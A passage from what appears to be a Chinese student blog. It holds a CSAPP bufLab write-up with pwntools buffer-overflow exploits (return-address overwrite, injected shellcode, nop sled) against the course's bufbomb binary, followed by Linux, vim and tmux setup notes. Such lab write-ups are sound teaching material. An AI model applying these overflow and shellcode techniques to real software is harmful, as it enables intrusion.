*handler)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigaction</span> <span class="hljs-title">action</span>, <span class="hljs-title">old_action</span>;</span><br><br>    action.sa_handler = handler;<br>    sigemptyset(&amp;action.sa_mask); <span class="hljs-comment">/* block sigs of type being handled */</span><br>    action.sa_flags = SA_RESTART; <span class="hljs-comment">/* restart syscalls if possible */</span><br><br>    <span class="hljs-keyword">if</span> (sigaction(signum, &amp;action, &amp;old_action) &lt; <span class="hljs-number">0</span>)<br>        unix_error(<span class="hljs-string">&quot;Signal error&quot;</span>);<br>    <span class="hljs-keyword">return</span> (old_action.sa_handler);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * sigquit_handler - The driver program can gracefully terminate the</span><br><span class="hljs-comment"> *    child shell by sending it a SIGQUIT signal.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">sigquit_handler</span><span class="hljs-params">(<span class="hljs-keyword">int</span> sig)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Terminating after receipt of SIGQUIT signal\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><p>总的来说不难的一个实验，关键在于要先理解整个框架中的代码，然后根据trace file渐进地完成程序。需要注意的地方实验讲义中的提示以及书本中都已经给出，这里不再赘述。需要强调的是SIGCHLD的信号处理程序需要处理未捕获的SIGTSTP和SIGINT信号。此外SIGINT/SIGTSTP和SIGCHLD的信号处理程序之间可能会有潜在的导致错误的冲突。（信号处理程序是可以被其他信号中断的，可以见trace16.txt）</p><h2 id="bufLab"><a href="#bufLab" class="headerlink" title="bufLab"></a>bufLab</h2><p>ctf pwn buffer overflow基础入门题目.</p><h3 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h3><p>由于bufbomb没有开PIE, 所以smoke的地址是固定的, 只要覆盖返回地址就行.</p><p>smoke() address: 0x08048E0A</p><img src="../../image/buflab/image-20220501205056212.png" alt="image-20220501205056212" style="zoom:80%;" /><p>getbuf没有开canary, 所以填充完0x28字节+8bytes rbp+0x08048E0A即可.</p><p>然后突然发现末尾有个0a, 于是换成10, 也就是smoke第三条指令的位置, 跳过了开辟占空间的过程不过这函数直接退出也没啥关系.</p><img src="../../image/buflab/image-20220501211931466.png" alt="image-20220501211931466" style="zoom:80%;" /><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python3 -c <span class="hljs-string">&quot;import pwn,sys;sys.stdout.buffer.write(b&#x27;b&#x27;*(0x28+0x4)+pwn.p32(0x08048E10))&quot;</span> &gt;input</span><br><span class="hljs-meta">$</span><span class="bash"> ./bufbomb -u yogdzewa &lt;input</span><br></code></pre></div></td></tr></table></figure><img src="../../image/buflab/image-20220501211857203.png" alt="image-20220501211857203" style="zoom:80%;" /><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>要调用fizz函数, 参数要等于<code>cookie = 0x24692446</code>.</p><p>所以gefbuf返回后跳到fizz, 栈底是返回地址, 再往下是第一个参数.</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python3 -c <span class="hljs-string">&quot;import pwn,sys;sys.stdout.buffer.write(b&#x27;b&#x27;*(0x28+0x4)+pwn.p32(0x08048DAF)+pwn.p32(0)+pwn.p32(0x24692446))&quot;</span> &gt;input</span> <br><span class="hljs-meta">$</span><span class="bash"> ./bufbomb -u yogdzewa &lt;input</span><br></code></pre></div></td></tr></table></figure><p><img src="../../image/CSAPP_Lab/image-20220501213601163.png" alt="image-20220501213601163"></p><h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>shellcode注入, 放到栈上执行, 需要修改一个bss段的全局变量. 如图: <img src="../../image/buflab/image-20220501214313652.png" alt="image-20220501214313652" style="zoom:80%;" /></p><p>在地址0x0804D10C处. 栈的基地址是根据cookie来确定的, 不过在每次运行中都不会变.</p><p>bang() address: <code>0x08048D52</code>, getbuf stack frame base: ebp -&gt; <code>0x55683c60</code>, getbuf’s buf: ebp-0x28=<code>0x55683C38</code></p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.binary=<span class="hljs-string">&#x27;./bufbomb&#x27;</span><br>shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov edi, 0x0804D10C</span><br><span class="hljs-string">mov [edi], dword ptr 0x24692446</span><br><span class="hljs-string">mov eax, 0x08048D52</span><br><span class="hljs-string">jmp eax#间接跳转也是可以的, 这个是绝对地址编码</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-comment">#18bytes long</span><br>tmp = asm(shellcode).ljust(<span class="hljs-number">40</span>) <span class="hljs-comment">#为了填满buf</span><br>pl = tmp+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">4</span>+p32(<span class="hljs-number">0x55683C38</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./input&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> o:<br>o.write(pl)<br></code></pre></div></td></tr></table></figure><p>完成.</p><img src="../../image/buflab/image-20220501221133428.png" alt="image-20220501221133428" style="zoom: 80%;" /><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>getbuf stack frame base: ebp -&gt; <code>0x55683c60</code>, getbuf’s buf: ebp-0x28=<code>0x55683C38</code> </p><p>在getbuf返回的时候跳转到shellcode, 修改eax为cookie. 这个时候如果要执行ret指令, 必须先在栈上压入原先的返回地址, 即<code>0x08048E50</code>, 这样就行了. 如果直接使用间接跳转都不用压入这个. </p><p>不过这样在返回test的时候ebp被破坏了, 不过反正栈没有变化, gdb查得值为<code>0x55683c90</code> </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.binary=<span class="hljs-string">&#x27;./bufbomb&#x27;</span><br>shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov eax, 0x24692446</span><br><span class="hljs-string">mov ecx, 0x08048E50</span><br><span class="hljs-string">jmp ecx</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>tmp = asm(shellcode).ljust(<span class="hljs-number">40</span>) <span class="hljs-comment">#为了填满buf</span><br>pl = tmp+p32(<span class="hljs-number">0x55683c90</span>)+p32(<span class="hljs-number">0x55683C38</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./input&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> o:<br>o.write(pl)<br></code></pre></div></td></tr></table></figure><p>完成.</p><img src="../../image/buflab/image-20220501222518773.png" alt="image-20220501222518773" style="zoom:80%;" /><h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>简单来说就是调用一个新函数<code>getbufn()</code>, 其中buf有520字节, 不过由于调用之前会随机在栈上分配一些空间, 所以ebp的值会发生改变, 为±240. 所以在五次运行期间要保证getbufn跳转到合适的位置. </p><p>所以直接使用nop sled技术. </p><p>getbuf stack frame base: ebp -&gt; <code>0x55683c60</code>, 最多减去240, 即<code>0x55683B70</code> </p><p>由于要返回到testn且多次执行, 这样ebp必须保证其不被破坏, 方法是利用esp和ebp的关系来在shellcode计算出来.</p><p>从getbufn返回的时候esp是testn的栈顶. 而testn的esp和ebp的关系是<code>ebp = esp + 0x28</code>.</p><img src="../../image/buflab/image-20220501233825396.png" alt="image-20220501233825396" style="zoom:80%;" /><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.binary=<span class="hljs-string">&#x27;./bufbomb&#x27;</span><br>shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">lea ebp, [esp+0x28]</span><br><span class="hljs-string">mov eax, 0x24692446</span><br><span class="hljs-string">mov ecx, 0x08048CE2</span><br><span class="hljs-string">jmp ecx</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>tmp = asm(shellcode).rjust(<span class="hljs-number">520</span>, <span class="hljs-string">b&#x27;\x90&#x27;</span>) <span class="hljs-comment">#nop sled</span><br>pl = tmp+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">4</span>+p32(<span class="hljs-number">0x55683B70f</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./input&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> o:<br>o.write(pl)<br></code></pre></div></td></tr></table></figure><p>完成.</p><img src="../../image/buflab/image-20220501233537565.png" alt="image-20220501233537565" style="zoom:80%;" /><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这次实验引导如何利用缓冲区存在的漏洞实现一些目的：</p><ol><li>Level0：利用直接覆盖返回地址，在调用函数getbuf时直接返回smoke函数，让我们初步认识缓冲区溢出攻击的原理。</li><li>Level1：在Level0的基础上，多了修改函数参数的操作，这需要我们结合汇编代码找到参数的位置。</li><li>Level2：开始需要我们自己编写汇编代码段去实现操作：修改返回值、设置全局变量、跳转。同时也需要利用缓冲区溢出，跳转至这段代码的起始地址。</li><li>Level3：同时利用自己编写的代码设置返回值并返回至test函数，需要覆盖buf时要保持函数保存的旧ebp不变。</li><li>Level4：每次调用getbufn的目的与Level3一致，不同的是它的ebp不断变化，需要找到等式关系去编写代码以修正而ebp。而多次调用使栈基址随机化，这需要利用nop_sled的技术。</li></ol><p>总的来说比较基础, 我用的是ctf的工具来写要输入的字节序列. 再结合一些命令行操作可以快速完成本次实验.</p>]]></content>
    
    
    <categories>
      
      <category>CS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CS</tag>
      
      <tag>Lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux relative hints</title>
    <link href="/2021-05/Now-linux%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2021-05/Now-linux%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="Kali-amp-Linux的问题"><a href="#Kali-amp-Linux的问题" class="headerlink" title="Kali&amp;Linux的问题"></a>Kali&amp;Linux的问题</h2><blockquote><p>linux<a href="https://www.runoob.com/linux/linux-command-manual.html">命令</a>在这</p></blockquote><ul><li>虚拟机的安装(又装了一遍)</li><li>VMtools的安装(为什么网上会有这么多的<a href="https://blog.csdn.net/love20165104027/article/details/83377758">方法</a>.</li><li>中文输入法Ibus的<a href="https://www.cnblogs.com/donghao0924/p/13503595.html">安装(</a>两行命令解决的事情有些教程搞得几十行,就离谱)</li><li>vim插件(彻底的失败) 不过在vim设置文件里设置了几个<a href="https://blog.csdn.net/lovewebeye/article/details/79960675">常用的</a>.</li><li>密码问题, root初始密码忘记, root下passwd指令.   默认账号kali kali</li><li>vim在share文件夹里</li><li>中文输入法出现[Invalid-UTF-8 code], 改成半角中文即可</li><li>make btest出错, 修改Makefile为生成64位可执行文件<a href="https://blog.csdn.net/mazamu/article/details/107021054">[0]</a>.</li><li>LInux中可执行文件和后缀名无关, 和文件的属性有关(????</li><li>bitset是一个类模板</li><li>GDB以及gcc的<a href="https://zhuanlan.zhihu.com/p/74897601">使用</a>(详见零碎知识)</li><li>kali如何运行可执行文件: ./bomb</li><li>中文输入法下输入命令:w按下回车vim会卡死, <strong>输入逗号也能卡死?????</strong> </li><li>kali装Chrome:他有sandbox机制, 无法在root用户下运行<a href="https://www.cnblogs.com/smart-zihan/p/13440084.html">[1]</a>.</li><li>kali使用vpn:  <strong>失败</strong>.</li><li>kill占了端口的进程<a href="https://blog.csdn.net/weixin_42108437/article/details/106072810">[0]</a>.</li><li>虚拟机卡死时查找log文件里的pid, 在任务管理器里停止</li><li>查看磁盘使用情况<a href="https://www.cnblogs.com/flyingeagle/articles/9219106.html">[0]</a>.</li><li>Typora的安装<a href="https://blog.csdn.net/qq_33694648/article/details/104403618">问题</a>.</li><li>.tar文件相关<a href="https://zhidao.baidu.com/question/873537413743808372.html">问题</a>.</li><li>root用户安装了vmtool, 切换到lbjyye后需要重新安装(?)</li><li>修改命令行终端字体大小: ~/.config/qterminal.org/qterminal.ini 里的fontsize或fontfamily并将其改为只读文件(<strong>新版完全没这个问题</strong>)</li><li>要显示隐藏文件夹直接到工具栏上的视图里去找</li><li><a href="https://blog.csdn.net/Cappuccino_jay/article/details/105474581">延长</a>锁屏时间</li><li>chorme里<a href="https://jingyan.baidu.com/article/75ab0bcb8547fed6864db2f8.html">添加</a>搜索引擎</li><li>vim无法打开文件, <a href="https://blog.csdn.net/qq_38238114/article/details/78524043">改为</a>下载GVIM</li><li>啥玩意儿啊, kali2021干吗搞没了图形界面clash弄半天也没成<a href="https://dcrelay.me/#/knowledge">[0]</a></li><li>main函数的两个参数: 一个是命令参数的个数, 另一个是命令参数数组,argv[0]是程序本身的文件名</li><li>**Typora里使用中文状态下的Ctrl+A, 文件直接丢失!!!!**太特么蠢了.</li><li>/usr/share/vim/vim82/colors/有vim的主题<ul><li>industry 全黑,  evening 还行, koel 超级黑的背景, morning 灰白很不错, murpy又是黑的字体细点,  peachpuff 桃色背景, shine 亮瞎狗眼 颜色太浅, slate 字体太紧, zellner 平平无奇的白底, 剩下的不用考虑</li></ul></li><li>了解了链接引用和脚注是个<a href="https://www.cnblogs.com/hnrainll/p/3514637.html">啥</a>.</li><li>Operation inconsistent with current state。VM报错, 只要以管理员身份运行就可以了</li><li>Linux中的Chrome无法自动升级,干脆就不升级了, 命令加一个<code>--disable-background-networking</code> </li><li>kali中使用中文输入法的时候无法在vscode中用光标选中文本</li><li>Kali成功登上google, 使用chrome的代理就成. 算是搞明白一点代理是怎么回事了, Kali没有全局代理只能再需要的软件里面设置代理, 命令行程序要用代理要装proxytrain<ul><li>proxychains<a href="https://oopsdc.com/post/proxychains%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/">使用方法</a>, 其中本机ip地址为<code>无线局域网适配器 WLAN:</code> ipv4那一栏的地址</li><li>终于啊, kali和ubuntu都能走代理了:sob: </li><li>过了一天好像又不行了, 换成<code>127.0.0.1 7891</code>后换了个新版本才行. <a href="http://www.bubuko.com/infodetail-3531993.html">link</a> </li></ul></li><li>非正常关机后要启动虚拟机只要删除<code> .lck</code>磁盘锁文件夹即可.</li><li>把kali的zsh设置(功能真的是相当全)直接弄到pwn.college上面, 整个界面就好看多了.</li><li><a href="https://linuxhint.com/bash_wildcard_tutorial/">bash_wildcard</a>!</li><li>start with <a href="https://miloserdov.org/?p=3343">cli in Kali</a> :<br><code>systemctl</code> <code>set-default multi-user.target</code> <code>start display-manager.service</code> <code>set-default graphical.target</code></li><li>像seccomp ltrace的路径必须是相对路径, 如果只写个文件名是不行的.</li><li><a href="https://www.shellscript.sh/test.html">shell scriping tutorial</a> </li><li>为了shelltools又装了一个apt install gcc-i686-linux-gnu, 不知道有没用.</li><li>zsh_hist:</li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">%</span><span class="bash">s/^\s*\d\+.\=\s\+//g <span class="hljs-comment">#trim `history -i 0` lineno in vim</span></span><br>history -i -n 0 #print all history in timeformat<br>awk &#x27;match($0,/: ([[:digit:]]+):/, a) &#123;if(a[1]&gt;1658275200) print $0;&#125;&#x27; .zsh_history &gt; /mnt/hgfs/LearingList/configFile/zsh_hist_new #add new history<br>awk &#x27;match($0,/: ([[:digit:]]+):/, a) &#123;if(a[1]&gt;$1) print $0;&#125;&#x27; .zsh_history &gt; /mnt/LearingList/configFile/zsh_hist/$(date +&quot;%y%m%d&quot;)#in script<br><span class="hljs-meta">#</span><span class="bash">remove duplicate</span><br>cat .zsh_history | sort -k2.14 -u | sort -k2 &gt; .zsh_history.tmp<br><span class="hljs-meta">#</span><span class="bash">or <span class="hljs-keyword">in</span> one line.</span><br>cd;sort -k2.14 -u .zsh_history | sort -k2 &gt; .zsh_history.tmp;mv .zsh_history.tmp .zsh_history;cd $OLDPWD<br></code></pre></div></td></tr></table></figure><ul><li><p>使用ssh pubkey连接到虚拟机中时遇到问题, 总是显示<code>permission denied</code>, 搜了两三个小时无果后终于发现在kali里面查看auth日志<code>tail -f /var/log/auth.log</code>可以看到是/root文件夹的grouping write权限导致ssh server拒绝连接. 直接一个<code>chmod 700 /root</code>解决问题. </p></li><li><p>vscode可以使用<code>move terminal to editor area</code>命令, 含义就是字面意思.</p></li><li></li></ul><h2 id="vim进阶"><a href="#vim进阶" class="headerlink" title="vim进阶"></a>vim进阶</h2><ul><li>自动提示： <code>&lt;C-n&gt;</code> 和 <code>&lt;C-p&gt;</code> </li><li>vim<a href="https://blog.easwy.com/archives/advanced-vim-skills-auto-complete/">路径补全</a> </li><li>vim添加tab切换快捷键, 以及单界面多文件<a href="https://linuxhint.com/opening_switching_multiple_files_vim/">操作</a>.<figure class="highlight asciidoc"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asciidoc"><span class="hljs-meta">:map ^[OR :tabp&lt;CR&gt;</span><br><span class="hljs-meta">:map ^[OS :tabn&lt;CR&gt;</span><br></code></pre></div></td></tr></table></figure></li><li>折叠:  <strong>zM</strong>: close all            <strong>zr</strong>: open all      <strong>za</strong>: openOrClose   <strong>zA</strong>: sameBut<strong>Recursively</strong> </li><li>颜色<a href="https://alvinalexander.com/linux/vi-vim-editor-color-scheme-syntax/">option</a> </li><li><code>autocmd BufNewFile,BufRead gdb* set filetype=gdb</code> 设置默认的语法高亮.</li><li><a href="https://vimhelp.org/cmdline.txt.html#%5Brange%5D">vim range</a> and <a href="https://vimhelp.org/usr_10.txt.html#10.3">this</a> </li><li>vim先输入数字然后进入插入模式后输入几个字符, 再返回普通模式会重复输入</li><li>:e =&gt; reload file</li><li>vim plug list -&gt; <a href="https://vimawesome.com/">link</a> | 装上了tabcompletion. + python completion </li><li><code>gt gT nnngt</code>: switch tabs.</li><li>Ctrl-O: enter <code>insert select</code> mode, can exec one command then.</li><li><a href="https://vimhelp.org/motion.txt.html#CTRL-M">motions(many details)</a> | </li><li><code>; </code>  :  Repeat latest f, t, F or T [count] times.</li><li><code>echo &amp;var</code> will print out the variable value.<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-string">&quot;dl&quot;</span>    <span class="hljs-function"><span class="hljs-keyword">delete</span> <span class="hljs-title">character</span> <span class="hljs-params">(alias: <span class="hljs-string">&quot;x&quot;</span>)</span>           dl</span><br><span class="hljs-function">&quot;diw&quot;   <span class="hljs-keyword">delete</span> inner word                       diw</span><br><span class="hljs-function">&quot;daw&quot;   <span class="hljs-keyword">delete</span> a word                           daw</span><br><span class="hljs-function">&quot;diW&quot;   <span class="hljs-keyword">delete</span> inner <span class="hljs-title">WORD</span> <span class="hljs-params">(see WORD)</span>          diW</span><br><span class="hljs-function">&quot;daW&quot;   <span class="hljs-keyword">delete</span> a <span class="hljs-title">WORD</span> <span class="hljs-params">(see WORD)</span>              daW</span><br><span class="hljs-function">&quot;dgn&quot;   <span class="hljs-keyword">delete</span> the next search pattern match    dgn</span><br><span class="hljs-function">&quot;dd&quot;    <span class="hljs-keyword">delete</span> one line                         dd</span><br><span class="hljs-function">&quot;dis&quot;   <span class="hljs-keyword">delete</span> inner sentence                   dis</span><br><span class="hljs-function">&quot;das&quot;   <span class="hljs-keyword">delete</span> a sentence                       das</span><br><span class="hljs-function">&quot;dib&quot;   <span class="hljs-keyword">delete</span> inner &#x27;<span class="hljs-params">(<span class="hljs-string">&#x27; &#x27;</span>)</span>&#x27; block              dib</span><br><span class="hljs-function">&quot;dab&quot;   <span class="hljs-keyword">delete</span> a &#x27;<span class="hljs-params">(<span class="hljs-string">&#x27; &#x27;</span>)</span>&#x27; block                  dab</span><br><span class="hljs-function">&quot;dip&quot;   <span class="hljs-keyword">delete</span> inner paragraph                  dip</span><br><span class="hljs-function">&quot;dap&quot;   <span class="hljs-keyword">delete</span> a paragraph                      dap</span><br><span class="hljs-function">&quot;diB&quot;   <span class="hljs-keyword">delete</span> inner &#x27;</span>&#123;<span class="hljs-string">&#x27; &#x27;</span>&#125;<span class="hljs-string">&#x27; block              diB</span><br><span class="hljs-string">&quot;daB&quot;   delete a &#x27;</span>&#123;<span class="hljs-string">&#x27; &#x27;</span>&#125;<span class="hljs-string">&#x27; block                  daB</span><br></code></pre></div></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">gUU  : Make current line uppercase.<br>guu :                   lowercase.<br>gU&#123;motion&#125; <span class="hljs-keyword">and</span> gu&#123;motion&#125;    Make &#123;motion&#125; text uppercase.<br><br>&#123;Visual&#125;CTRL-A <span class="hljs-comment"># INC</span><br>&#123;Visual&#125;g CTRL-A <span class="hljs-comment"># sequencial add</span><br><span class="hljs-built_in">set</span> nrformats=<span class="hljs-built_in">bin</span>,<span class="hljs-built_in">hex</span> <span class="hljs-comment"># this is default. can include `octal` `alpha`</span><br>Use the following<br><br>steps to make a numbered <span class="hljs-built_in">list</span>.<br><span class="hljs-number">1.</span> Create the first list_entry, make sure it starts <span class="hljs-keyword">with</span> a number.<br><span class="hljs-number">2.</span> qa        - start recording into register <span class="hljs-string">&#x27;a&#x27;</span><br><span class="hljs-number">3.</span> Y         - yank the entry<br><span class="hljs-number">4.</span> p         - put a copy of the entry below the first one<br><span class="hljs-number">5.</span> CTRL-A    - increment the number<br><span class="hljs-number">6.</span> q         - stop recording<br><span class="hljs-number">7.</span> &lt;count&gt;@a - repeat the yank, put <span class="hljs-keyword">and</span> increment &lt;count&gt; times<br></code></pre></div></td></tr></table></figure></li><li><a href="https://vimhelp.org/change.txt.html#complex-change">complex changes</a> : toooooo complex.</li><li><a href="https://vimhelp.org/pattern.txt.html#pattern-overview">regex pattern</a> | and an useful <a href="http://vimregex.com/">post</a> </li><li><strong>qa记录到a中, @a执行宏, num@a执行num次, @@执行上一个宏</strong>.</li><li><a href="https://vimhelp.org/motion.txt.html#various-motions">variable motion</a>, 比如说跳到下一个method或者#if. </li></ul><h2 id="tmux-gdb"><a href="#tmux-gdb" class="headerlink" title="tmux+gdb"></a>tmux+gdb</h2><ul><li><a href="https://github.com/tmux/tmux">tmux</a>  <a href="https://github.com/tuxotron/voltron-tmux">tmux-voltron</a>  <a href="https://github.com/tmuxinator/tmuxinator">tmuxinator</a>  <a href="https://github.com/snare/voltron">voltron</a> 这方法可能没啥用.</li><li>使用pwndbg的split: <a href="https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md#splitting--layouting-context">features</a> | <a href="https://github.com/jerdna-regeiz/splitmind">split mind</a> </li><li><a href="https://www.hamvocke.com/blog/a-guide-to-customizing-your-tmux-conf/">tmux config</a> | cheat <a href="https://tmuxcheatsheet.com/">sheet</a> | <a href="https://pragprog.com/titles/bhtmux2/tmux-2/">tutorial</a> </li><li>加载config文件失败: <code>tmux kill-server</code> or reload</li><li><code>for i in &#123;0..255&#125;; do  printf &quot;\x1b[38;5;$&#123;i&#125;mcolor%-5i\x1b[0m&quot; $i ; if ! (( ($i + 1 ) % 8 )); then echo ; fi ; done</code>找到所有的颜色.</li><li><code>&lt;prefix&gt; !</code>或者<code>:join-pane -t &lt;int&gt;</code>可以将一个spane移进或移出.</li><li>Ctrl+b, <code>.</code>, <code>222</code> (renumber) | Ctrl+A+q = windows number | </li></ul><h2 id="ubuntu2004"><a href="#ubuntu2004" class="headerlink" title="ubuntu2004"></a>ubuntu2004</h2><ul><li>ubuntu虽然任务栏不好用, 但是有快捷键挺舒服的, 继续记!</li><li>ubuntu sudo命令延时很长<a href="https://blog.csdn.net/kiritow/article/details/80687036">解决办法</a> </li><li>更新<a href="https://blog.csdn.net/wangyijieonline/article/details/105360138">ubuntu源</a> </li><li>linux终端<a href="http://www.360doc.com/content/16/0615/15/7044580_567984505.shtml">快捷键</a> </li><li>通过增加快捷键绑定解决vim终端中无法使用方向键的问题</li><li>init 0重启发现挂载失败了, 之前那个命令也不管用了, 只能倒回上一个快照继续, 还好博客都是用的共享文件夹.<br>不说了, 快照再次救我一命.<ul><li>找到了解决办法, 要给普通用户权限访问</li></ul></li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">echo &quot; &quot; | sudo -S vmhgfs-fuse -o allow_other ......<br></code></pre></div></td></tr></table></figure><ul><li><p>colorizing man pages: <a href="https://askubuntu.com/questions/156383/how-to-have-colored-manual-pages-in-gnome-terminal/834107#834107">link</a> &amp;&amp; <a href="https://seamatinee.com/2021/09/23/ubuntu-customization/#Terminal-%E7%BE%8E%E5%8C%96">zsh</a> </p></li><li><p>save zsh history and multiterminal-hisory-share <a href="https://blog.lilydjwg.me/2013/7/3/manually-save-read-zsh-history-entries.39852.html">link</a> </p></li><li><p>zsh-autosuggestions: kali默认装上而ubuntu没有的(他有个啥??)自动历史命令建议.<br>使用<code>sudo apt install zsh-autosuggestions</code>即可装上. </p></li><li><p>通过修改/etc/passwd文件来使得root用户的home换到<code>/home/lbjyye</code>, 先尝试一段时间, 真的不想打sudo, kali root用习惯了</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">chmod -R 755 /home/lbjyye/.local/share/zinit<br>chown -R root:root /home/lbjyye/.local/share/zinit<br></code></pre></div></td></tr></table></figure></li><li><p>docker-desktop的旧context整的我半天用不了……</p></li><li><p>发现代理失效了, 试了半天结果删除了设置中的FTP代理地址就成功了. 不然之前连google都上不去. 玄学问题, 既然解决了就不管了. </p></li></ul><h2 id="ubuntu2204"><a href="#ubuntu2204" class="headerlink" title="ubuntu2204"></a>ubuntu2204</h2><ul><li><a href="https://linuxconfig.org/how-to-allow-gui-root-login-on-ubuntu-22-04-jammy-jellyfish-linux">enable root account in ubuntu</a> </li><li>结果chrome显示出问题了(换成了测试版), firefox的同步又蠢得一b, 真是受不了了.</li><li></li></ul><h2 id="各种命令-软件包"><a href="#各种命令-软件包" class="headerlink" title="各种命令+软件包"></a>各种命令+软件包</h2><ul><li><em>ldd</em>  <em>strace(刚刚装的)</em> <em>head打印前n行</em>  <em>du显示文件大小</em>   <em>ps打印进程信息</em>  <ul><li>ldd: print shared object dependencies</li><li>ps aux  –  BSD参数风格</li></ul></li><li>Linux下<code>!</code>的<a 